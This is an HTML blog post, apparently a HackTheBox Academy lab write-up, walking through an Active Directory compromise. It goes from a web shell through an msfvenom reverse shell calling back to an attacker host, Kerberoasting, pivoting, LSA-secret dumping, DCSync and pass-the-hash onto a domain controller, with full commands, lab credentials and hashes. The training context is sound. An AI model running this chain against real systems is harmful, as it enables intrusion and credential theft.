@@ -1,0 +1,511 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AD Enumeration & Attacks - Part I - PixRei Writeup</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-primary: #0a0f0a;
+            --bg-secondary: #0d120d;
+            --bg-card: #111611;
+            --text-primary: #c8d6c8;
+            --text-secondary: #6b7c6b;
+            --text-muted: #3d4a3d;
+            --accent: #00ff88;
+            --accent-dim: #00cc6a;
+            --accent-glow: rgba(0, 255, 136, 0.15);
+            --border: #1a251a;
+            --htb-green: #9fef00;
+            --thm-red: #ff4444;
+            --easy: #4ade80;
+            --medium: #fbbf24;
+            --hard: #ef4444;
+            --code-bg: #0d1117;
+        }
+        [data-theme="light"] {
+            --bg-primary: #f0f4f0;
+            --bg-secondary: #e8ece8;
+            --bg-card: #ffffff;
+            --text-primary: #1a251a;
+            --text-secondary: #4a5a4a;
+            --text-muted: #8a9a8a;
+            --accent: #00994d;
+            --accent-dim: #007a3d;
+            --accent-glow: rgba(0, 153, 77, 0.1);
+            --border: #d0dcd0;
+            --code-bg: #f6f8fa;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html { scroll-behavior: smooth; }
+        body { font-family: 'Inter', -apple-system, sans-serif; background: var(--bg-primary); color: var(--text-primary); line-height: 1.8; }
+        .grid-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: -1; background-image: linear-gradient(var(--border) 1px, transparent 1px), linear-gradient(90deg, var(--border) 1px, transparent 1px); background-size: 60px 60px; opacity: 0.3; }
+        header { position: fixed; top: 0; left: 0; right: 0; z-index: 1000; background: rgba(10, 15, 10, 0.8); backdrop-filter: blur(20px); border-bottom: 1px solid var(--border); }
+        [data-theme="light"] header { background: rgba(240, 244, 240, 0.9); }
+        nav { max-width: 900px; margin: 0 auto; padding: 1rem 2rem; display: flex; justify-content: space-between; align-items: center; }
+        .logo { font-family: 'JetBrains Mono', monospace; font-size: 1.3rem; font-weight: 700; color: var(--accent); text-decoration: none; }
+        .logo::before { content: '> '; opacity: 0.5; }
+        .nav-right { display: flex; gap: 1rem; align-items: center; }
+        .back-btn { font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; color: var(--text-secondary); text-decoration: none; padding: 0.5rem 1rem; border: 1px solid var(--border); border-radius: 6px; transition: all 0.2s; }
+        .back-btn:hover { border-color: var(--accent); color: var(--accent); }
+        .theme-toggle { background: var(--bg-card); border: 1px solid var(--border); color: var(--accent); width: 40px; height: 40px; border-radius: 8px; cursor: pointer; font-size: 1rem; }
+        .theme-toggle:hover { border-color: var(--accent); }
+        .article-container { max-width: 900px; margin: 0 auto; padding: 7rem 2rem 4rem; }
+        .article-meta { display: flex; gap: 0.75rem; margin-bottom: 1.5rem; flex-wrap: wrap; }
+        .badge { font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; padding: 0.4rem 0.8rem; border-radius: 4px; text-transform: uppercase; font-weight: 600; }
+        .badge.htb { background: rgba(159, 239, 0, 0.2); color: var(--htb-green); }
+        .badge.os { background: var(--accent-glow); color: var(--accent); }
+        .article-title { font-family: 'JetBrains Mono', monospace; font-size: 2.5rem; font-weight: 700; margin-bottom: 1rem; color: var(--text-primary); }
+        .article-info { display: flex; gap: 2rem; color: var(--text-muted); font-size: 0.85rem; margin-bottom: 3rem; padding-bottom: 2rem; border-bottom: 1px solid var(--border); flex-wrap: wrap; }
+        .toc-box { background: var(--bg-card); border: 1px solid var(--border); border-radius: 12px; padding: 1.5rem; margin-bottom: 3rem; }
+        .toc-heading { font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; color: var(--accent); margin-bottom: 1rem; display: block; }
+        .toc-links { list-style: none; margin: 0; padding: 0; }
+        .toc-links li { margin-bottom: 0.6rem; }
+        .toc-links li:last-child { margin-bottom: 0; }
+        .toc-links a { color: var(--text-secondary); text-decoration: none; font-size: 0.9rem; transition: color 0.2s; }
+        .toc-links a:hover { color: var(--accent); }
+        .toc-links a::before { content: '→ '; opacity: 0.5; }
+        .content h2 { font-family: 'JetBrains Mono', monospace; font-size: 1.4rem; color: var(--accent); margin: 3rem 0 1.5rem; padding-bottom: 0.5rem; border-bottom: 1px solid var(--border); }
+        .content h3 { font-family: 'JetBrains Mono', monospace; font-size: 1.1rem; color: var(--text-primary); margin: 2rem 0 1rem; }
+        .content p { color: var(--text-secondary); margin-bottom: 1.5rem; }
+        .content ul, .content ol { color: var(--text-secondary); margin-bottom: 1.5rem; padding-left: 1.5rem; }
+        .content li { margin-bottom: 0.5rem; }
+        .content strong { color: var(--text-primary); }
+        .content a { color: var(--accent); text-decoration: none; }
+        .content a:hover { text-decoration: underline; }
+        .code-block { background: var(--code-bg); border: 1px solid var(--border); border-radius: 8px; margin: 1.5rem 0; overflow: hidden; }
+        .code-header { background: var(--bg-card); padding: 0.5rem 1rem; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
+        .code-lang { font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; color: var(--text-muted); }
+        .copy-btn { font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; background: none; border: 1px solid var(--border); color: var(--text-secondary); padding: 0.25rem 0.5rem; border-radius: 4px; cursor: pointer; transition: all 0.2s; }
+        .copy-btn:hover { border-color: var(--accent); color: var(--accent); }
+        .code-block pre { padding: 1rem; margin: 0; overflow-x: auto; }
+        .code-block code { font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; color: var(--text-primary); line-height: 1.6; background: none; padding: 0; }
+        .content code { font-family: 'JetBrains Mono', monospace; font-size: 0.85em; background: var(--bg-secondary); padding: 0.15rem 0.4rem; border-radius: 4px; color: var(--accent); }
+        .info-box { background: var(--bg-card); border: 1px solid var(--border); border-left: 4px solid var(--accent); border-radius: 8px; padding: 1rem 1.5rem; margin: 1.5rem 0; }
+        .info-box.warning { border-left-color: var(--medium); }
+        .info-box.danger { border-left-color: var(--hard); }
+        .info-box.success { border-left-color: var(--easy); }
+        .info-box-title { font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; color: var(--accent); margin-bottom: 0.5rem; }
+        .info-box.warning .info-box-title { color: var(--medium); }
+        .info-box.danger .info-box-title { color: var(--hard); }
+        .info-box.success .info-box-title { color: var(--easy); }
+        .info-box p { margin-bottom: 0; font-size: 0.9rem; }
+        .info-box ul { margin-bottom: 0; font-size: 0.9rem; }
+        .takeaways { background: var(--accent-glow); border: 1px solid var(--accent); border-radius: 12px; padding: 1.5rem; margin: 3rem 0; }
+        .takeaways h3 { font-family: 'JetBrains Mono', monospace; font-size: 1rem; color: var(--accent); margin-bottom: 1rem; }
+        .takeaways ul { margin-bottom: 0; padding-left: 1.5rem; color: var(--text-secondary); }
+        .takeaways li { margin-bottom: 0.5rem; }
+        .takeaways strong { color: var(--text-primary); }
+        .article-nav { display: flex; justify-content: space-between; gap: 1rem; margin-top: 4rem; padding-top: 2rem; border-top: 1px solid var(--border); }
+        .nav-link { font-family: 'JetBrains Mono', monospace; font-size: 0.9rem; color: var(--text-secondary); text-decoration: none; padding: 1rem; border: 1px solid var(--border); border-radius: 8px; transition: all 0.2s; flex: 1; min-width: 150px; }
+        .nav-link:hover { border-color: var(--accent); color: var(--accent); }
+        .nav-link.prev { text-align: left; }
+        .nav-link.next { text-align: right; }
+        .nav-link.next::after { content: ' →'; }
+        .nav-link span { display: block; font-size: 0.7rem; color: var(--text-muted); margin-bottom: 0.25rem; }
+        footer { padding: 3rem 0; border-top: 1px solid var(--border); text-align: center; margin-top: 4rem; }
+        .footer-text { font-size: 0.8rem; color: var(--text-muted); }
+        @media (max-width: 768px) {
+            .article-title { font-size: 1.8rem; }
+            .article-container { padding: 6rem 1rem 2rem; }
+            .article-nav { flex-direction: column; }
+        }
+    </style>
+</head>
+<body>
+    <div class="grid-bg"></div>
+    <header>
+        <nav>
+            <a href="../../index.html" class="logo">PixRei ./blog/AD-Part-I</a>
+            <div class="nav-right">
+                <a href="../index.html" class="back-btn">← All Posts</a>
+                <button class="theme-toggle" id="themeToggle">◐</button>
+            </div>
+        </nav>
+    </header>
+    <main>
+        <article class="article-container">
+            <div class="article-meta">
+                <span class="badge htb">HackTheBox Academy</span>
+                <span class="badge" style="background: rgba(239,68,68,0.2); color: var(--hard);">Hard</span>
+                <span class="badge os">Windows / AD</span>
+            </div>
+
+            <h1 class="article-title">AD Enumeration &amp; Attacks - Part I</h1>
+
+            <div class="article-info">
+                <span>📅 Aug 04, 2026</span>
+                <span>⏱️ 12 min read</span>
+                <span>🏷️ Kerberoasting, Pivoting, LSA, DCSync</span>
+            </div>
+
+            <div class="toc-box">
+                <span class="toc-heading">// Table of Contents</span>
+                <ul class="toc-links">
+                    <li><a href="#summary">Summary</a></li>
+                    <li><a href="#foothold">Web Shell Foothold</a></li>
+                    <li><a href="#shell">Upgrading to Meterpreter</a></li>
+                    <li><a href="#kerberoast">Kerberoasting from SYSTEM</a></li>
+                    <li><a href="#pivot">Pivoting to MS01</a></li>
+                    <li><a href="#lsa">LSA Secrets &amp; a New User</a></li>
+                    <li><a href="#dcsync">DCSync Rights &amp; Domain Takeover</a></li>
+                    <li><a href="#takeaways">Key Takeaways</a></li>
+                </ul>
+            </div>
+
+            <div class="content">
+                <h2 id="summary">Summary</h2>
+                <p>This Hard assessment starts us right on a compromised web server (<code>WEB-WIN01</code>) with a teammate's password-protected web shell already in place. From that single foothold the chain runs through the whole Active Directory attack lifecycle: <strong>Kerberoasting</strong> a service account from SYSTEM, <strong>pivoting</strong> into the internal network with Meterpreter, dumping <strong>LSA secrets</strong> to recover a cached user, and finally abusing that user's <strong>DCSync</strong> rights to pull the domain Administrator hash and pass-the-hash onto the domain controller.</p>
+
+                <div class="info-box">
+                    <div class="info-box-title">💡 Environment</div>
+                    <p>
+                        <strong>Entry host:</strong> WEB-WIN01 (SYSTEM via web shell)<br>
+                        <strong>Internal subnet:</strong> 172.16.6.0/23<br>
+                        <strong>Targets:</strong> MS01 (172.16.6.50), DC01 (172.16.6.3)<br>
+                        <strong>Key skills:</strong> Kerberoasting, Meterpreter pivoting, LSA secrets, DCSync, Pass-the-Hash
+                    </p>
+                </div>
+
+                <div class="info-box">
+                    <div class="info-box-title">// starting note</div>
+                    <p>Our teammate left a password-protected web shell (credentials <code>admin:My_W3bsH3ll_P@ssw0rd!</code>) in the <code>/uploads</code> directory for us to start from.</p>
+                </div>
+
+                <h2 id="foothold">Web Shell Foothold</h2>
+                <p>The foothold is already waiting, we just need to reach it. Browsing to <code>/uploads</code> shows two files. <code>web.config</code> returns a 404, so that's a dead end, leaving <code>antak.aspx</code> as our way in. Logging in with the provided credentials drops us into the ANTAK web shell.</p>
+
+
+                <p>First thing on any shell: figure out who and where we are.</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>PS&gt; hostname
+WEB-WIN01
+
+PS&gt; whoami
+nt authority\system</code></pre>
+                </div>
+
+                <div class="info-box success">
+                    <div class="info-box-title">🔑 Already SYSTEM</div>
+                    <p>The web shell runs as <code>NT AUTHORITY\SYSTEM</code>, the highest local privilege. That matters later: SYSTEM on a domain-joined host is exactly what makes the Kerberoasting step trivial.</p>
+                </div>
+
+                <h2 id="shell">Upgrading to Meterpreter</h2>
+                <p>A web shell is fine for one-off commands, but for real enumeration and pivoting we want a proper interactive session. I generated a Meterpreter reverse shell with <code>msfvenom</code> and caught it with <code>multi/handler</code>.</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.204 -f exe -o revshell.exe LPORT=8008
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+Payload size: 509 bytes
+Final size of exe file: 7680 bytes
+Saved as: revshell.exe
+
+$ msfconsole -q
+msf &gt; use multi/handler
+msf exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp
+msf exploit(multi/handler) &gt; set LHOST 10.10.14.204
+msf exploit(multi/handler) &gt; set LPORT 8008
+msf exploit(multi/handler) &gt; run
+[*] Started reverse TCP handler on 10.10.14.204:8008</code></pre>
+                </div>
+
+                <p>The web shell can upload files, which land in <code>C:\</code>. With the listener running, executing <code>revshell.exe</code> brings the session back.</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">meterpreter</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>[*] Sending stage (248902 bytes) to 10.129.84.115
+[*] Meterpreter session 1 opened (10.10.14.204:8008 -&gt; 10.129.84.115:49707)
+
+meterpreter &gt; cat C:\Users\Administrator\Desktop\flag.txt
+JusT********</code></pre>
+                </div>
+
+                <p>First flag is sitting on the Administrator desktop, easy grab now that we have a real session.</p>
+
+                <h2 id="kerberoast">Kerberoasting from SYSTEM</h2>
+                <p>The next objective points at a specific service account, the one holding the SPN <code>MSSQLSvc/SQL01.inlanefreight.local:1433</code>. To find it we enumerate every SPN in the domain with the built-in <code>setspn.exe</code>.</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">powershell: setspn</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>PS C:\Users\Administrator\Desktop&gt; setspn.exe -Q */*
+Checking domain DC=INLANEFREIGHT,DC=LOCAL
+...
+CN=****,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+        MSSQLSvc/SQL01.inlanefreight.local:1433
+CN=sqlprod,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+        MSSQLSvc/SQL02.inlanefreight.local:1433
+...
+Existing SPN found!</code></pre>
+                </div>
+
+                <p>The account tied to that SPN shows up right next to it, which answers the first question. Now to crack its password.</p>
+
+                <div class="info-box">
+                    <div class="info-box-title">📊 Why Kerberoasting Works</div>
+                    <p>Any authenticated user can request a service ticket (TGS) for an SPN. That ticket is encrypted with the service account's password hash, so if the account has a weak password, we can request the ticket and crack it <em>offline</em>, no interaction with the account itself.</p>
+                </div>
+
+                <p>Since we're SYSTEM on a domain host, we request the TGS straight into memory with a .NET call, then let Mimikatz export it.</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">powershell: request TGS</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>PS&gt; Add-Type -AssemblyName System.IdentityModel
+PS&gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken `
+      -ArgumentList "MSSQLSvc/SQL01.inlanefreight.local:1433"
+
+ServicePrincipalName : MSSQLSvc/SQL01.inlanefreight.local:1433
+ValidFrom            : 8/4/2026 12:04:57 PM
+ValidTo              : 8/4/2026 9:24:13 PM</code></pre>
+                </div>
+
+                <p>With the ticket cached, transfer Mimikatz over (I used a quick Python HTTP server) and export it as base64 so we can paste it straight onto the attack host, no <code>.kirbi</code> file transfer needed.</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">mimikatz: export ticket</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>mimikatz # base64 /out:true
+isBase64InterceptOutput is true
+
+mimikatz # kerberos::list /export
+[00000000] - 0x00000012 - aes256_hmac
+   Server Name : krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
+====================
+doIFSDCCBUSgAwIBBaEDAgE9DQUyiNTAzoAMCAQKhLDAqGwhNU1NRTFN2Yxse&lt;...SNIP...&gt;</code></pre>
+                </div>
+
+                <p>Back on the attack host, strip the newlines, base64-decode into a <code>.kirbi</code>, convert to a John-friendly hash with <code>kirbi2john</code>, and crack against rockyou.</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">bash: crack the ticket</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>$ cat blob.txt | tr -d '\n' | base64 -d &gt; TGT.kirbi
+$ kirbi2john TGT.kirbi &gt; TGT.txt
+tickets written: 1
+
+$ john --format=krb5tgs -w /usr/share/wordlists/rockyou.txt TGT.txt
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+lu***           (?)
+1g 0:00:00:00 DONE
+Session completed.</code></pre>
+                </div>
+
+                <div class="info-box success">
+                    <div class="info-box-title">🔑 Service Account Cracked</div>
+                    <p>The <code>krb5tgs</code> hash falls almost instantly, handing us the cleartext password for the <code>svc_sql</code> service account. Reused credentials are the whole point of Kerberoasting, and this one gets reused immediately.</p>
+                </div>
+
+                <h2 id="pivot">Pivoting to MS01</h2>
+                <p>Those credentials are only useful if we can reach the internal hosts. A ping sweep from Meterpreter maps the subnet.</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">meterpreter: ping sweep</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>meterpreter &gt; run post/multi/gather/ping_sweep RHOSTS=172.16.6.0/23
+[+]     172.16.6.3 host found
+[+]     172.16.6.50 host found
+[+]     172.16.6.100 host found</code></pre>
+                </div>
+
+                <p>We're <code>172.16.6.100</code>, so the other two are the DC and MS01. <code>nbtstat</code> resolves which is which.</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">cmd: nbtstat</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>C:\&gt;nbtstat -A 172.16.6.3
+    DC01           &lt;20&gt;  UNIQUE      Registered
+
+C:\&gt;nbtstat -A 172.16.6.50
+    MS01           &lt;20&gt;  UNIQUE      Registered</code></pre>
+                </div>
+
+                <p>So <code>172.16.6.3</code> is DC01 and <code>172.16.6.50</code> is MS01. To reach that subnet from our own tooling we add a route through the session with <code>autoroute</code>, then scan MS01 through it.</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">meterpreter: autoroute</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>meterpreter &gt; run autoroute -s 172.16.6.0/23
+[+] Added route to 172.16.6.0/255.255.254.0 via 10.129.84.115</code></pre>
+                </div>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">bash: scan through the route</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>$ nmap -Pn -sT -T4 172.16.6.50 --min-rate 1000
+PORT     STATE SERVICE
+80/tcp   open  http
+135/tcp  open  msrpc
+3389/tcp open  ms-wbt-server
+8080/tcp open  http-proxy</code></pre>
+                </div>
+
+                <p>RDP (3389) is open. A port forward exposes it locally, and we log in with the cracked <code>svc_sql</code> credentials.</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">bash: portfwd + RDP</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>meterpreter &gt; portfwd add -l 1234 -p 3389 -r 172.16.6.50
+
+$ xfreerdp /u:svc_sql /p:lucky7 /v:127.0.0.1:1234 \
+    /drive:share,/home/pix/Desktop/Tools/Active-Directory +clipboard</code></pre>
+                </div>
+
+
+                <p>The account has Administrator rights on MS01, so the second flag is a simple read.</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">cmd: flag</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>C:\Users\Administrator\Desktop&gt;type flag.txt
+spn$_*****</code></pre>
+                </div>
+
+                <h2 id="lsa">LSA Secrets &amp; a New User</h2>
+                <p>Next we hunt for another domain user's credentials. <code>query user</code> shows a second account with an active console session on the box.</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">cmd: query user</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>C:\Users\Administrator\Desktop&gt;query user
+ USERNAME     SESSIONNAME   ID  STATE   LOGON TIME
+ t***         console       1   Active  8/4/2026 6:22 AM
+&gt;svc_sql      rdp-tcp#0     2   Active  8/4/2026 7:21 AM</code></pre>
+                </div>
+
+                <p>My first instinct was Mimikatz for a cleartext dump, but WDIGEST is disabled here, so the <code>wdigest</code> and <code>kerberos</code> password fields come back <code>(null)</code>. We only get the NTLM hash.</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">mimikatz: WDIGEST null</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>* Username : t****
+* NTLM     : fd37b6fec5704cadabb319cebf9e3a3a
+wdigest :
+ * Password : (null)
+kerberos :
+ * Password : (null)</code></pre>
+                </div>
+
+                <div class="info-box warning">
+                    <div class="info-box-title">⚠️ WDIGEST Disabled</div>
+                    <p>On modern Windows, WDIGEST cleartext caching is off by default, so Mimikatz's <code>sekurlsa::logonpasswords</code> won't just hand over the password. That's a dead end for cleartext here, so we pivot to a different source: LSA secrets, which cache the last logon's plaintext for some accounts.</p>
+                </div>
+
+                <p>We already have autoroute, so spinning up the <code>socks_proxy</code> module lets us reach MS01 through proxychains and dump LSA secrets with netexec.</p>
+
+                <div class="info-box">
+                    <div class="info-box-title">// proxychains tip</div>
+                    <p>Make sure the SOCKS version in the Metasploit module matches what <code>proxychains4.conf</code> expects (socks4a vs socks5). A mismatch here is the classic cause of silent timeouts, check it first if the connection just hangs.</p>
+                </div>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">bash: netexec --lsa</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>$ proxychains4 netexec smb 172.16.6.50 -u svc_sql -p lucky7 --lsa
+SMB  172.16.6.50  445  MS01  [+] INLANEFREIGHT.LOCAL\svc_sql:lucky7 (Pwn3d!)
+SMB  172.16.6.50  445  MS01  [*] Dumping LSA secrets
+SMB  172.16.6.50  445  MS01  INLANEFREIGHT\t****:Sup***********
+SMB  172.16.6.50  445  MS01  [+] Dumped 10 LSA secrets</code></pre>
+                </div>
+
+                <div class="info-box success">
+                    <div class="info-box-title">🔑 Cleartext Recovered</div>
+                    <p>The LSA dump hands us the target user's cleartext password at the bottom of the output, exactly the value Mimikatz couldn't give us. Two different tools, one succeeds where the other can't.</p>
+                </div>
+
+                <h2 id="dcsync">DCSync Rights &amp; Domain Takeover</h2>
+                <p>Before using the new user we check what it can actually do in the domain. Sharing <code>PowerView.ps1</code> over the RDP-mounted drive, we grab the user's SID and inspect the domain object's ACL for replication rights.</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">powershell: check replication ACL</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>PS&gt; Get-ObjectAcl "DC=INLANEFREIGHT,DC=LOCAL" -ResolveGUIDs `
+    | ?{$_.ObjectAceType -match 'Replication-Get'} `
+    | ?{$_.SecurityIdentifier -eq $sid} `
+    | select ActiveDirectoryRights,ObjectAceType | fl
+
+ActiveDirectoryRights : ExtendedRight
+ObjectAceType         : DS-Replication-Get-Changes
+
+ActiveDirectoryRights : ExtendedRight
+ObjectAceType         : DS-Replication-Get-Changes-All</code></pre>
+                </div>
+
+                <div class="info-box danger">
+                    <div class="info-box-title">⚠️ DCSync Rights</div>
+                    <p>The pair <code>DS-Replication-Get-Changes</code> + <code>DS-Replication-Get-Changes-All</code> is exactly what a <strong>DCSync</strong> attack needs. With both, this user can impersonate a domain controller and ask the real DC to replicate any account's password hashes, including the domain Administrator and krbtgt.</p>
+                </div>
+
+                <p>So we DCSync the domain Administrator with <code>impacket-secretsdump</code>, straight through proxychains.</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">bash: DCSync</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>$ proxychains4 impacket-secretsdump -just-dc-user administrator \
+    INLANEFREIGHT/t*****@172.16.6.3
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:27dedb1da*****a0:::
+[*] Kerberos keys grabbed
+[*] Cleaning up...</code></pre>
+                </div>
+
+                <p>We have the Administrator NT hash. A quick port check shows WinRM (5985) open on the DC, so we pass-the-hash straight in with evil-winrm, no password needed.</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">bash: pass-the-hash to DC01</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>$ proxychains4 evil-winrm -i 172.16.6.3 -u Administrator \
+    -H 27dedb1dab4d8545c6e1c66fba077da0
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; dir
+-a----   4/11/2022   7:17 PM   19 flag.txt</code></pre>
+                </div>
+
+                <div class="info-box danger">
+                    <div class="info-box-title">🏆 Domain Compromise</div>
+                    <p>The chain is complete: <strong>web shell (SYSTEM) → Kerberoast svc_sql → pivot to MS01 → LSA secrets → DCSync rights → pass-the-hash on DC01</strong>. Reading the final <code>flag.txt</code> from the domain controller's Administrator desktop closes out Part I. Domain owned.</p>
+                </div>
+
+                <div class="takeaways">
+                    <h3>🎯 Key Takeaways</h3>
+                    <ul>
+                        <li><strong>Left-behind artifacts are footholds:</strong> a forgotten web shell handed us SYSTEM with zero exploitation.</li>
+                        <li><strong>SYSTEM on a domain host = easy Kerberoasting:</strong> request the TGS into memory, export with Mimikatz, crack offline.</li>
+                        <li><strong>One session becomes a network:</strong> <code>autoroute</code> + <code>socks_proxy</code> turn a single Meterpreter shell into full internal reach.</li>
+                        <li><strong>WDIGEST off isn't the end:</strong> when Mimikatz returns <code>(null)</code>, LSA secrets can still recover cleartext.</li>
+                        <li><strong>Replication rights are domain ownership:</strong> <code>Get-Changes</code> + <code>Get-Changes-All</code> on a normal user means DCSync.</li>
+                        <li><strong>DCSync into Pass-the-Hash:</strong> pull the Administrator hash, then authenticate to the DC with the hash alone.</li>
+                    </ul>
+                </div>
+
+                <h3>Tools Used</h3>
+                <ul>
+                    <li><code>msfvenom</code> / <code>metasploit</code>, reverse shell, pivoting, SOCKS proxy</li>
+                    <li><code>setspn.exe</code> / <code>mimikatz</code>, SPN enumeration and ticket export</li>
+                    <li><code>kirbi2john</code> / <code>john</code>, Kerberoast cracking</li>
+                    <li><code>netexec</code>, LSA secrets dump</li>
+                    <li><code>PowerView.ps1</code>, ACL / DCSync-rights enumeration</li>
+                    <li><code>impacket-secretsdump</code> / <code>evil-winrm</code>, DCSync and pass-the-hash</li>
+                </ul>
+            </div>
+
+            <nav class="article-nav">
+                <a href="../index.html" class="nav-link prev"><span>Back</span>All Posts</a>
+                <a href="ad-skills-assessment-part2.html" class="nav-link next"><span>Next</span>AD Part II</a>
+            </nav>
+        </article>
+    </main>
+    <footer>
+        <p class="footer-text">© 2026 PixRei // Security Research &amp; Writeups</p>
+    </footer>
+    <script>
+        const themeToggle = document.getElementById('themeToggle');
+        const html = document.documentElement;
+        function setTheme(theme) {
+            html.setAttribute('data-theme', theme);
+            localStorage.setItem('theme', theme);
+            themeToggle.textContent = theme === 'dark' ? '◐' : '◑';
+        }
+        setTheme(localStorage.getItem('theme') || 'dark');
+        themeToggle.addEventListener('click', () => {
+            setTheme(html.getAttribute('data-theme') === 'dark' ? 'light' : 'dark');
+        });
+        function copyCode(btn) {
+            const code = btn.closest('.code-block').querySelector('code').textContent;
+            navigator.clipboard.writeText(code).then(() => {
+                btn.textContent = 'Copied!';
+                setTimeout(() => { btn.textContent = 'Copy'; }, 2000);
+            });
+        }
+    </script>
+</body>
+</html>
